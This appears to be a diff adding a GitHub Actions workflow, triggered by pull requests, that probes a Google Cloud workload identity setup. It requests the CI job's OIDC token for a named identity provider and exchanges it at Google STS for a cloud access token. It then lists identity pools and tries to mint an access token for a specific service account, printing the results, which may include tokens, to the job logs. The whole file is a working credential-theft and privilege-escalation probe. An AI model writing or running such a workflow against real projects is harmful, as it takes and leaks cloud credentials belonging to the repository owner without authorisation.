@@ -1,0 +1,33 @@
+name: oidc-probe
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/oidc.yml'
+      - 'probe.txt'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump token and try STS
+        env:
+          AUD: //iam.googleapis.com/projects/149671192594/locations/global/workloadIdentityPools/github-actions/providers/github
+        run: |
+          echo "CTX repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          echo "REPO_OWNER=$GITHUB_REPOSITORY_OWNER head_ref=$GITHUB_HEAD_REF"
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo NO_OIDC_ENDPOINT; exit 0; fi
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" -o tok.json
+          python3 -c "import json,base64;p=json.load(open('tok.json'))['value'].split('.')[1];print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())"
+          python3 -c "import json;print(json.dumps({'grant_type':'urn:ietf:params:oauth:grant-type:token-exchange','audience':'//iam.googleapis.com/projects/149671192594/locations/global/workloadIdentityPools/github-actions/providers/github','scope':'https://www.googleapis.com/auth/cloud-platform','requested_token_type':'urn:ietf:params:oauth:token-type:access_token','subject_token_type':'urn:ietf:params:oauth:token-type:jwt','subject_token':json.load(open('tok.json'))['value']}))" > body.json
+          echo "=== STS ==="
+          curl -sS -X POST https://sts.googleapis.com/v1/token -H 'content-type: application/json' -d @body.json -o sts.out -w 'HTTP:%{http_code}\n'
+          head -c 2500 sts.out; echo
+          FT=$(python3 -c "import json;print(json.load(open('sts.out')).get('access_token',''))" 2>/dev/null)
+          if [ -n "$FT" ]; then
+            echo "=== POOLS ==="
+            curl -sS -H "Authorization: Bearer $FT" 'https://iam.googleapis.com/v1/projects/149671192594/locations/global/workloadIdentityPools?pageSize=100' -w '\nHTTP:%{http_code}\n'
+            echo "=== IAMCRED sandbox-vm-sa ==="
+            curl -sS -X POST -H "Authorization: Bearer $FT" -H 'content-type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sandbox-vm-sa@simular-note.iam.gserviceaccount.com:generateAccessToken' -w '\nHTTP:%{http_code}\n'
+          fi
